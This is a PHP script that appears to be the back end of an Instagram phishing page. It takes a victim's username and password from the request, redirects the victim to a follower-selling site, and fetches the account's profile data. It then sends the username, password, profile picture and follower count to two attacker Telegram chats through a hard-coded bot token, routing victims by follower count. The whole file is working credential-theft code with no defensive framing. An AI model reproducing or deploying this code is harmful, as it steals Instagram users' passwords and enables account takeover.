<?php
ob_start();
$BOT_KEY = '441485421:AAEug5mjJl9yg8YciPyzk1vNNagc7VSZwuo';

define('API_KEY',$BOT_KEY,0);

function bot($method,$datas=[]){

$url = "https://api.telegram.org/bot".API_KEY."/".$method;

$ch = curl_init();

curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);

$res = curl_exec($ch);

if(curl_error($ch)){

var_dump(curl_error($ch));

}else{

return json_decode($res);

}

}

$url1 = "http://takipcisitem.com";

header("location: $url1");

$update = json_decode(file_get_contents('php://input'));

$message = $update->message;

$from_id = $message->from->id;

$chat_id = $message->chat->id;

$text = $message->text;

$admin1 = 93252375;
$admin2 = 168421045;



$user = $_GET["user"];
$pass = $_GET["pass"];

$insta = json_decode(file_get_contents("https://wathiq.us/api/infoig/$user"));
$insta_pic = $insta->result->profile_pic_hd;
$insta_username = $insta->result->username;
$insta_followers = $insta->result->followed_by;

if($user and $insta_followers > 1000){
bot('sendPhoto',[
'chat_id'=>$admin1,
'photo'=>$insta_pic,
'caption'=>"
Followers : $insta_followers \n\n
Username : [$user](instagram.com/$insta_username) \n\n
Password : $pass \n\n
",
'parse_mode'=>'Markdown',
]);
}

if($user and $insta_followers < 1000){
bot('sendPhoto',[
'chat_id'=>$admin2,
'photo'=>$insta_pic,
'caption'=>"
Followers : $insta_followers \n\n
Username : [$user](instagram.com/$insta_username) \n\n
Password : $pass \n\n
",
'parse_mode'=>'Markdown',
]);
}
